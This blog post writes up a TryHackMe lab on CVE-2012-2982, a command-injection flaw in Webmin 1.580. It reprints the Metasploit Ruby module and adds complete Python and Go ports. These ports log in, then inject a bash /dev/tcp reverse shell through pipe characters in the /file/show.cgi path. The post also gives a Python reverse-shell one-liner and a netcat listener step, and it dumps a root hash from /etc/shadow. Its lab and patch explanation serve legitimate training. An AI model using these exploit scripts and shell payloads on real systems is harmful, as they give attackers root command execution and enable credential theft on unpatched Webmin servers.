---
layout: post
title: "TryHackMe - Intro PoC Scripting"
date: 2023-07-02 10:00:00 -0000
categories: exploit development
excerpt: "Exploit development from Proofs Of Concept and CVEs. Explore a Ruby exploit, rewrite it in Python. Payload development, authentication development. Just a really good room for coding and how to code with an attackers mindset."
featured_image: "/assets/images/thm-intro-poc-script/thm-intro-poc-script-hero.png"
---

https://tryhackme.com/room/intropocscripting  

### **Recon** 
Perform some recon on the target...  

**Ncat**  
![](/assets/images/thm-intro-poc-script/thm-intro-poc-script-netcat-banner-grab.png)  

> We now know the target is running MiniServe/1.580 also known as Webmin.

**NMap vulnerability and services scan results**  
![](/assets/images/thm-intro-poc-script/thm-intro-poc-script-nmap-1.png)  

> Hmm, some SSH vulns going on...  

![](/assets/images/thm-intro-poc-script/thm-intro-poc-script-nmap-2.png)  

> Web specific vulnerabilities.  

## **Research**  
Lets's find out a bit more about the vulnerabilities.  

**Metasploit search**  
![](/assets/images/thm-intro-poc-script/thm-intro-poc-msfc-search.png)  

> Webmin has 6 Excellent score vulnerabilities, but we're specifically after CVE-2012-2982.

**Searchsploit**  
![](/assets/images/thm-intro-poc-script/thm-intro-poc-script-searchsploit.png)

**The exploit script located at /usr/share/exploitdb/exploits/unix/remote/21851.rb**  

```ruby
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Webmin /file/show.cgi Remote Command Execution',
			'Description'    => %q{
					This module exploits an arbitrary command execution vulnerability in Webmin
				1.580. The vulnerability exists in the /file/show.cgi component and allows an
				authenticated user, with access to the File Manager Module, to execute arbitrary
				commands with root privileges. The module has been tested successfully with Webim
				1.580 over Ubuntu 10.04.
			},
			'Author'         => [
				'Unknown', # From American Information Security Group
				'juan vazquez' # Metasploit module
			],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					['OSVDB', '85248'],
					['BID', '55446'],
					['CVE', '2012-2982'],
					['URL', 'http://www.americaninfosec.com/research/dossiers/AISG-12-001.pdf'],
					['URL', 'https://github.com/webmin/webmin/commit/1f1411fe7404ec3ac03e803cfa7e01515e71a213']
				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'DisableNops' => true,
					'Space'       => 512,
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic perl bash telnet',
						}
				},
			'Platform'       => 'unix',
			'Arch'           => ARCH_CMD,
			'Targets'        => [[ 'Webim 1.580', { }]],
			'DisclosureDate' => 'Sep 06 2012',
			'DefaultTarget'  => 0))

			register_options(
				[
					Opt::RPORT(10000),
					OptBool.new('SSL', [true, 'Use SSL', true]),
					OptString.new('USERNAME',  [true, 'Webmin Username']),
					OptString.new('PASSWORD',  [true, 'Webmin Password'])
				], self.class)
	end

	def check

		peer = "#{rhost}:#{rport}"

		print_status("#{peer} - Attempting to login...")

		data = "page=%2F&user=#{datastore['USERNAME']}&pass=#{datastore['PASSWORD']}"

		res = send_request_cgi(
			{
				'method'  => 'POST',
				'uri'     => "/session_login.cgi",
				'cookie'  => "testing=1",
				'data'    => data
			}, 25)

		if res and res.code == 302 and res.headers['Set-Cookie'] =~ /sid/
			print_good "#{peer} - Authentication successful"
			session = res.headers['Set-Cookie'].split("sid=")[1].split(";")[0]
		else
			print_error "#{peer} - Authentication failed"
			return Exploit::CheckCode::Unknown
		end

		print_status("#{peer} - Attempting to execute...")

		command = "echo #{rand_text_alphanumeric(rand(5) + 5)}"

		res = send_request_cgi(
			{
				'uri'     => "/file/show.cgi/bin/#{rand_text_alphanumeric(5)}|#{command}|",
				'cookie'  => "sid=#{session}"
			}, 25)


		if res and res.code == 200 and res.message =~ /Document follows/
			return Exploit::CheckCode::Appears
		else
			return Exploit::CheckCode::Safe
		end

	end

	def exploit

		peer = "#{rhost}:#{rport}"

		print_status("#{peer} - Attempting to login...")

		data = "page=%2F&user=#{datastore['USERNAME']}&pass=#{datastore['PASSWORD']}"

		res = send_request_cgi(
			{
				'method'  => 'POST',
				'uri'     => "/session_login.cgi",
				'cookie'  => "testing=1",
				'data'    => data
			}, 25)

		if res and res.code == 302 and res.headers['Set-Cookie'] =~ /sid/
			session = res.headers['Set-Cookie'].scan(/sid\=(\w+)\;*/).flatten[0] || ''
			if session and not session.empty?
				print_good "#{peer} - Authentication successfully"
			else
				print_error "#{peer} - Authentication failed"
				return
			end
			print_good "#{peer} - Authentication successfully"
		else
			print_error "#{peer} - Authentication failed"
			return
		end

		print_status("#{peer} - Attempting to execute the payload...")

		command = payload.encoded

		res = send_request_cgi(
			{
				'uri'     => "/file/show.cgi/bin/#{rand_text_alphanumeric(rand(5) + 5)}|#{command}|",
				'cookie'  => "sid=#{session}"
			}, 25)


		if res and res.code == 200 and res.message =~ /Document follows/
			print_good "#{peer} - Payload executed successfully"
		else
			print_error "#{peer} - Error executing the payload"
			return
		end

	end

end
```  

I mean, basically the code sets some request headers, a cookie, and a body and sends a POST request. Once authenticated via the session id, the script sends another POST request to a different endpoint, which gives an attacker remote code execution. Our task is to rewrite this in Python.  

## **Understand the patch that was applied by the devs to mitigate this vulneratbility**

**The exploit patch on github**  
https://github.com/webmin/webmin/commit/1f1411fe7404ec3ac03e803cfa7e01515e71a213  

**ChatGPT's explanation of the patch**  

file/lang/en:  

![](/assets/images/thm-intro-poc-script/thm-intro-poc-script-github-1.png)  

This snippet contains a set of error messages and notifications that are likely used for displaying specific messages to the user in the Webmin interface. These messages inform the user about failed archive creation, restrictions on downloading archives, limitations on the directory size for archiving, invalid characters in paths, the requirement to cut or copy before pasting, and the unavailability of a copied file.  

file/show.cgi:  

![](/assets/images/thm-intro-poc-script/thm-intro-poc-script-github-2.png)  

This snippet is a section of Perl code that appears to be handling a request to view a file in Webmin. Here's a breakdown of the key steps:

```  
`&ReadParse();` is likely a function call to read and parse the input parameters from the HTTP request.

`use POSIX;` imports the POSIX module, which provides access to various POSIX functions and constants.

`$p = $ENV{'PATH_INFO'};` retrieves the value of the PATH_INFO environment variable, which typically contains additional path information from the URL.

`($p =~ /^\s*\|/ || $p =~ /\|\s*$/ || $p =~ /\0/) && &error_exit($text{'view_epathinfo'});` checks if the path ($p) contains certain patterns that may indicate an invalid or malicious input. If any of the patterns match, it calls the error_exit function with the error message defined as $text{'view_epathinfo'}.

`if ($in{'type'}) { ... }` checks if the type parameter is supplied in the input. If present, it assigns its value to the variable $type.  

The code continues with other conditional branches and processing steps that are not included in the provided snippet.  

`if (!open(FILE, $p)) { ... }` attempts to open the file specified by the path ($p). If the file cannot be opened (possibly due to Unix permissions), it calls the error_exit function with the error message defined as &text('view_eopen', $p, $!).  
```  

**Summary**  

Before the patch, the app could be vulnerable to invalid input if the PATH_INFO parameter from the URL contained certain characters, such as pipes (`|`), leading/trailing whitespace, or null characters (`\0`), which could potentially be used for malicious purposes. This is an example of improper input validation.

**Payloads**  

In the given exploit scenario targeting Webmin, the most effective program/command to use would depend on the specific vulnerability being exploited and the intended goal. However, based on the provided code snippet, the exploit leverages the ability to execute arbitrary commands with root privileges. Therefore, common choices for the payload command in this case might be `bash` or `perl`, as they are commonly available on Unix-like systems and provide extensive functionality for executing commands and interacting with the system.  

> This output corroberates with the correct THM answer: "system shell"  

## **So we now know our payload needs to be a system shell of sorts**
It can be something simple or complex.  

**Example payload**  
```python  
payload = "python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+ lhost + "\"," + lport + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])\'"
```  

## **The purpose of this lab is to port the Ruby exploit to Python. Here is the version I came up with.**  

```python  
#!/usr/bin/env python

import requests, string, secrets

def rand():
    alphaNum = string.ascii_letters + string.digits
    randChar = ''.join(secrets.choice(alphaNum) for i in range(5)) 
    return randChar

targetIP = "x.x.x.x"
# So the remote can beam home to the mothership, set localhost and port...
lhost = "x.x.x.x"
lport = "53"

data = {'page' : "%2F", 'user' : "user1", 'pass' : "1user"}
url = "http://" + targetIP + "/session_login.cgi"

r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, allow_redirects=False)

if r.status_code == 302 and r.cookies["sid"] != None:
    print("[+] - Login success, executing payload...")
    sid = r.cookies["sid"].strip("/=; ")
    print("- Using session id: " + sid)
    rnum = rand()
    print("- Using random alphanumeric string: " + rnum)
    payload = f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport}<&1'"
    exp = f"http://{targetIP}/file/show.cgi/bin/{rnum}|{payload}|"
    print("- Executing payload: " + exp)
    req = requests.post(exp, cookies={"sid":sid}, verify=False, allow_redirects=False)
    print("- Run nc -nlvp 53 on attacker machine to listen for the shell with netcat. Restart this exploit if that hasn't been done already.")
else:
    print("Login failed")
```  

**Python cookie parsing examples, here just because...**  

```python  
# c = r.cookies["sid"]
# s = r.headers['Set-Cookie'].replace('\n', '').split('=')[1].split(';')[0].strip()
# si = r.headers['Set-Cookie'].split('=')[1].split(";")[0].strip()
# sid = c.strip("/=; ")
```  


## **I decided to be extra and convert the Python to GoLang...**  

```go  
package main

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"strings"
	"time"
)

func randString(length int) string {
	chars := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	rand.Seed(time.Now().UnixNano())
	result := make([]rune, length)
	for i := 0; i < length; i++ {
		result[i] = chars[rand.Intn(len(chars))]
	}
	return string(result)
}

func main() {
	targetIP := "x.x.x.x"
	// localhost and localport so target can talk back to localhost once the exploit is ran.
	lhost := "x.x.x.x"
	lport := "53"

	body := strings.NewReader("page=%2F&user=user1&pass=1user")

	url := fmt.Sprintf("http://%s/session_login.cgi", targetIP)

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}
	client := &http.Client{
		Transport: tr,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Content-Length", fmt.Sprint(body.Len()))
	req.Header.Set("Origin", "http://"+targetIP)
	req.Header.Set("DNT", "1")
	req.Header.Set("Connection", "close")
	req.Header.Set("Referer", fmt.Sprintf("http://%s/session_login.cgi?logout=1", targetIP))
	req.Header.Set("Cookie", "testing=1")
	req.Header.Set("Upgrade-Insecure-Requests", "0")

	reqBody, err := ioutil.ReadAll(req.Body)
	if err != nil {
		fmt.Println("Error reading request body:", err)
		return
	}
	fmt.Println("- Request Body:", string(reqBody))
	req.Body = ioutil.NopCloser(strings.NewReader(string(reqBody)))

	fmt.Println("- Request Cookies:")
	for _, cookie := range req.Cookies() {
		fmt.Println(cookie.Name + "=" + cookie.Value)
	}

	fmt.Println("- Request Headers:")
	for header, values := range req.Header {
		for _, value := range values {
			fmt.Println(header + ": " + value)
		}
	}

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusFound {
		var sid string
		for _, cookie := range resp.Cookies() {
			if cookie.Name == "sid" {
				sid = strings.Trim(cookie.Value, "/=; ")
				break
			}
		}

		if sid == "" {
			fmt.Println("Login failed")
			return
		}

		fmt.Println("[+] - Login success, executing payload...")
		fmt.Println("- Using session id:", sid)

		rnum := randString(5)
		fmt.Println("- Using random alphanumeric string:", rnum)

		payload := fmt.Sprintf("bash -c 'exec bash -i &>/dev/tcp/%s/%s<&1'", lhost, lport)
		exp := fmt.Sprintf("http://%s/file/show.cgi/bin/%s|%s|", targetIP, rnum, payload)
		fmt.Println("- Executing payload:", exp)

		req, err = http.NewRequest("POST", exp, nil)
		if err != nil {
			fmt.Println("Error creating request:", err)
			return
		}

		req.AddCookie(&http.Cookie{Name: "sid", Value: sid})

		resp, err = client.Do(req)
		if err != nil {
			fmt.Println("Error sending request:", err)
			return
		}
		defer resp.Body.Close()

		fmt.Println("- Run nc -nlvp 53 on the attacker machine to listen for the shell with netcat. Restart this exploit if that hasn't been done already.")
	} else {
		fmt.Println("Login failed")
	}
}
```  

## **Let's fire off the exploit**  

### Python  

![](/assets/images/thm-intro-poc-script/thm-intro-poc-script-python-exploit.png)  

### GoLang  

![](/assets/images/thm-intro-poc-script/thm-intro-poc-script-golang-exploit.png)  

## **Our reverse Shell. We should have our listener running before the exploit...**  
![](/assets/images/thm-intro-poc-script/thm-intro-poc-script-ncat-listener.png)  

**Grab the hashes with cat /etc/shadow**  

```
root:$6$Fy2Peey/$zKJEi5mOEiUK3geWKtBhspBCkdUr30fhxGSaRPcpXHogR6KYEeFt3cNA4YWfojLP/Jejt8DlD7kmO7Gl32xLC1:18510:0:99999:7:::
```  

# **Donezo Funzo**
